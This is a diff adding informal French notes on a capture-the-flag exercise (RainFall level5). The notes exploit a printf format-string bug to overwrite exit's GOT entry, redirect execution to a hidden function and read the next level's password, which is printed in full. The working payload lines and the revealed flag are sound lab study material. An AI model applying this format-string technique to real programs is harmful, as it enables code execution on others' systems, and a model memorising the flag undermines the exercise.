@@ -1,0 +1,47 @@
+level5@RainFall:~$ ./level5 
+abcd
+abcd
+
+gdb
+info function
+
+0x080484a4  o
+0x080484c2  n
+0x08048504  main
+
+main appel n et
+n n'appel pas o
+mais dans o il y a ce qui nous permet d'avoir le flag
+mais dans n il y a un printf on peut donc essayer d'exploiter la faille 
+
+on doit donc ce retrouver ici:
+0x080484a5 <+1>:     mov    %esp,%ebp
+
+on test
+python -c "print('AAAA' + '%x '*10)") | ./level5 
+AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520 
+
+du coup on rajoute le printf
+j'ai compris qu'il fallait faire un overide a exit de la fonction p
+puis apres au debut de la fonction o pour que ca marche
+
+pour avoir l'adresse de exit j'ai trouver au'on pouvais faire
+disas 0x80483d0
+et on a 0x080483d0 <+0>:     jmp    *0x8049838
+0x8049838 et son adresse
+
+(python -c "print('AAAA' + '\x38\x98\x04\x08' + '%x '*5)") | ./level5 
+AAAA8200 b7fd1ac0 b7ff37d0 41414141 8049838 
+
+maintenat il faut aller a
+0x080484a5 <+1>:     mov    %esp,%ebp
+donc on ecrit 0x080484a5 = 134513829 car - 8 et le apres on fait comme le level 4
+(python -c "print('AAAA' + '\x38\x98\x04\x08' + '%134513821d' + '%5\$n')"; cat -) | ./level5
+bon les espace c plutot chiant du coup on fait 
+(python -c "print('AAAA' + '\x38\x98\x04\x08' + '%134513821d' + '%5\$n')"; cat -) | ./level5  | tr -d ' '
+et y a plus cas ecrire 
+cat /home/user/level6/.pass
+et hop
+AAAA8d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+il faut enlever les AAAA8
